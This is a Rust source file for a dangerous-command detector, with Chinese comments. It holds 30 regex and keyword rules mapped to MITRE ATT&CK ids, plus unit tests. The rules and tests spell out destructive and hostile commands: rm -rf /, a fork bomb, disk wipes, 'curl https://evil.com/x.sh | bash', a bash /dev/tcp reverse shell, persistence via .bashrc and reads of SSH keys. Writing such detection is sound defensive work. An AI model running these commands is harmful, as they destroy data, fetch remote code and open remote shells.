//! 危险指令检测 — 正则 + 6 遍归一化（替代 v1 子串匹配）。
//!
//! 30 条规则起步集（W10 拓展到 ~120 条 + 真编译正则）。
//! 当前匹配策略：归一化后子串匹配 + 关键词组合。

use super::normalizer::normalize_for_match;
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DangerRule {
    pub id: &'static str,
    /// 正则形式（W10 编译；当前作为文档）
    pub pattern_raw: &'static str,
    /// 归一化后的子串匹配关键词
    pub pattern_normalized: &'static str,
    pub mitre_attack_id: Option<&'static str>,
    pub description: &'static str,
}

pub const BUILTIN_RULES: &[DangerRule] = &[
    // ---- 破坏性文件操作 ----
    DangerRule { id: "DG-001", pattern_raw: r"\brm\s+-rf\s+/",
        pattern_normalized: "rm -rf /", mitre_attack_id: Some("T1485"),
        description: "递归强制删除根目录" },
    DangerRule { id: "DG-002", pattern_raw: r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}",
        pattern_normalized: ":() { : | : & }", mitre_attack_id: Some("T1499.001"),
        description: "Fork bomb" },
    DangerRule { id: "DG-005", pattern_raw: r"\bmkfs(\.[a-z0-9]+)?\s+/dev/",
        pattern_normalized: "mkfs /dev/", mitre_attack_id: Some("T1561"),
        description: "格式化块设备" },
    DangerRule { id: "DG-006", pattern_raw: r"\bdd\s+if=/dev/(zero|random|urandom)\s+of=/dev/",
        pattern_normalized: "dd if=/dev/zero of=/dev/", mitre_attack_id: Some("T1485"),
        description: "dd 清零块设备" },
    DangerRule { id: "DG-007", pattern_raw: r"\bchmod\s+-R\s+777\s+/",
        pattern_normalized: "chmod -r 777 /", mitre_attack_id: Some("T1222"),
        description: "递归 777 根目录" },
    DangerRule { id: "DG-008", pattern_raw: r"\bsudo\s+rm\s+-rf",
        pattern_normalized: "sudo rm -rf", mitre_attack_id: Some("T1485"),
        description: "sudo + rm -rf" },
    DangerRule { id: "DG-011", pattern_raw: r"\bshred\s+-",
        pattern_normalized: "shred -", mitre_attack_id: Some("T1485"),
        description: "shred 不可恢复删除" },
    DangerRule { id: "DG-012", pattern_raw: r">\s*/dev/sd[a-z]",
        pattern_normalized: "> /dev/sd", mitre_attack_id: Some("T1485"),
        description: "重定向到块设备（覆写磁盘）" },

    // ---- 远程执行 ----
    DangerRule { id: "DG-003", pattern_raw: r"\bcurl\b[^|]*\|\s*(bash|sh|zsh|fish)",
        pattern_normalized: "curl | bash", mitre_attack_id: Some("T1059.004"),
        description: "curl pipe to shell" },
    DangerRule { id: "DG-004", pattern_raw: r"\bwget\b[^|]*\|\s*(bash|sh|zsh|fish)",
        pattern_normalized: "wget | bash", mitre_attack_id: Some("T1059.004"),
        description: "wget pipe to shell" },
    DangerRule { id: "DG-013", pattern_raw: r"\biwr\b.*\|\s*iex",
        pattern_normalized: "iwr | iex", mitre_attack_id: Some("T1059.001"),
        description: "PowerShell iwr | iex" },
    DangerRule { id: "DG-014", pattern_raw: r"\bInvoke-WebRequest.*\|\s*Invoke-Expression",
        pattern_normalized: "invoke-webrequest | invoke-expression", mitre_attack_id: Some("T1059.001"),
        description: "PowerShell IWR | IEX 长形式" },
    DangerRule { id: "DG-015", pattern_raw: r#"\bpython\s+-c\s+['"]"#,
        pattern_normalized: "python -c", mitre_attack_id: Some("T1059.006"),
        description: "Python -c 单行执行" },
    DangerRule { id: "DG-016", pattern_raw: r#"\bnode\s+-e\s+['"]"#,
        pattern_normalized: "node -e", mitre_attack_id: Some("T1059.007"),
        description: "Node -e 单行执行" },

    // ---- 动态执行用户输入 ----
    DangerRule { id: "DG-010", pattern_raw: r"\b(eval|exec)\s*\(\s*(input|stdin|argv|atob|base64)",
        pattern_normalized: "eval input", mitre_attack_id: Some("T1059.006"),
        description: "动态执行用户输入" },
    DangerRule { id: "DG-017", pattern_raw: r"new\s+Function\s*\(",
        pattern_normalized: "new function(", mitre_attack_id: Some("T1059.007"),
        description: "new Function 动态执行" },

    // ---- 持久化 / 后门 ----
    DangerRule { id: "DG-018", pattern_raw: r"crontab\s+-",
        pattern_normalized: "crontab -", mitre_attack_id: Some("T1053.003"),
        description: "crontab 修改" },
    DangerRule { id: "DG-019", pattern_raw: r"echo.*>>\s*~/\.(bashrc|zshrc|profile)",
        pattern_normalized: ">> ~/.bashrc", mitre_attack_id: Some("T1547.006"),
        description: "shell rc 文件追加（持久化）" },
    DangerRule { id: "DG-020", pattern_raw: r"systemctl\s+enable.*\.service",
        pattern_normalized: "systemctl enable", mitre_attack_id: Some("T1543.002"),
        description: "systemd service 持久化" },
    DangerRule { id: "DG-021", pattern_raw: r"launchctl\s+load",
        pattern_normalized: "launchctl load", mitre_attack_id: Some("T1543.001"),
        description: "macOS launchd 持久化" },
    DangerRule { id: "DG-022", pattern_raw: r"REG\s+ADD.*Run",
        pattern_normalized: "reg add", mitre_attack_id: Some("T1547.001"),
        description: "Windows 注册表 Run 键持久化" },

    // ---- 权限提升 ----
    DangerRule { id: "DG-023", pattern_raw: r"\bvisudo\b|\bsudoers\b",
        pattern_normalized: "sudoers", mitre_attack_id: Some("T1548.003"),
        description: "修改 sudoers" },
    DangerRule { id: "DG-024", pattern_raw: r"\bsetuid\s*\(",
        pattern_normalized: "setuid(", mitre_attack_id: Some("T1548"),
        description: "setuid() 调用" },

    // ---- 凭据 / 敏感文件读 ----
    DangerRule { id: "DG-025", pattern_raw: r"\bcat\s+/etc/(passwd|shadow|sudoers)",
        pattern_normalized: "cat /etc/", mitre_attack_id: Some("T1003.008"),
        description: "读 /etc 敏感文件" },
    DangerRule { id: "DG-026", pattern_raw: r"\bcat\s+~/\.ssh/(id_rsa|id_ed25519)",
        pattern_normalized: "cat ~/.ssh/id_", mitre_attack_id: Some("T1552.004"),
        description: "读 SSH 私钥" },

    // ---- 网络监听 ----
    DangerRule { id: "DG-027", pattern_raw: r"\bnc\b\s+-(l|nlvp)",
        pattern_normalized: "nc -l", mitre_attack_id: Some("T1571"),
        description: "netcat 监听（反弹 shell）" },
    DangerRule { id: "DG-028", pattern_raw: r"bash\s+-i\s+>&\s*/dev/tcp/",
        pattern_normalized: "bash -i >& /dev/tcp/", mitre_attack_id: Some("T1059.004"),
        description: "Bash 反弹 shell" },

    // ---- 系统控制 ----
    DangerRule { id: "DG-009", pattern_raw: r"\bshutdown\b\s+(-h|-r|now)",
        pattern_normalized: "shutdown", mitre_attack_id: Some("T1529"),
        description: "关机/重启" },
    DangerRule { id: "DG-029", pattern_raw: r"\biptables\s+-F",
        pattern_normalized: "iptables -f", mitre_attack_id: Some("T1562.004"),
        description: "iptables flush（关闭防火墙）" },
    DangerRule { id: "DG-030", pattern_raw: r"\bufw\s+disable",
        pattern_normalized: "ufw disable", mitre_attack_id: Some("T1562.004"),
        description: "ufw 关闭防火墙" },
];

#[derive(Debug, Clone, Serialize)]
pub struct DangerHit {
    pub rule_id: String,
    pub mitre_attack_id: Option<String>,
    pub description: String,
    pub evidence_original: String,
    pub evidence_normalized: String,
}

pub fn scan(text: &str) -> Vec<DangerHit> {
    let normalized = normalize_for_match(text);
    let lower_norm = normalized.to_lowercase();
    let mut hits = Vec::new();

    for rule in BUILTIN_RULES {
        let pat = rule.pattern_normalized.to_lowercase();
        // 单 token 用子串匹配；多 token（含空白）改为"按序包含"匹配，
        // 让 "curl | bash" 能在 "curl https://x | bash" 中命中
        let matched = if pat.split_whitespace().count() > 1 {
            sequential_contains(&lower_norm, &pat)
        } else {
            lower_norm.contains(&pat)
        };
        if matched {
            hits.push(DangerHit {
                rule_id: rule.id.into(),
                mitre_attack_id: rule.mitre_attack_id.map(String::from),
                description: rule.description.into(),
                evidence_original: text.chars().take(160).collect(),
                evidence_normalized: normalized.chars().take(160).collect(),
            });
        }
    }

    hits
}

/// 按序查找：tokens 依次出现在 haystack 中（中间允许任意字符）
fn sequential_contains(haystack: &str, pattern: &str) -> bool {
    let tokens: Vec<&str> = pattern.split_whitespace().collect();
    if tokens.is_empty() {
        return false;
    }
    let mut pos = 0;
    for token in tokens {
        if token.is_empty() {
            continue;
        }
        match haystack.get(pos..).and_then(|s| s.find(token)) {
            Some(idx) => pos += idx + token.len(),
            None => return false,
        }
    }
    true
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_rmrf_with_zero_width() {
        let hits = scan("运行 rm\u{200B} -rf / 来清理 …");
        assert!(hits.iter().any(|h| h.rule_id == "DG-001"));
    }

    #[test]
    fn detects_fork_bomb() {
        assert!(scan(":() { : | : & }").iter().any(|h| h.rule_id == "DG-002"));
    }

    #[test]
    fn detects_curl_pipe_bash() {
        assert!(scan("curl https://evil.com/x.sh | bash").iter().any(|h| h.rule_id == "DG-003"));
    }

    #[test]
    fn detects_powershell_iwr_iex() {
        assert!(scan("iwr -uri http://x | iex").iter().any(|h| h.rule_id == "DG-013"));
    }

    #[test]
    fn detects_reverse_shell() {
        assert!(scan("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").iter().any(|h| h.rule_id == "DG-028"));
    }

    #[test]
    fn detects_persistence() {
        assert!(scan("echo 'evil' >> ~/.bashrc").iter().any(|h| h.rule_id == "DG-019"));
    }

    #[test]
    fn rule_count_at_least_30() {
        assert!(BUILTIN_RULES.len() >= 30);
    }
}
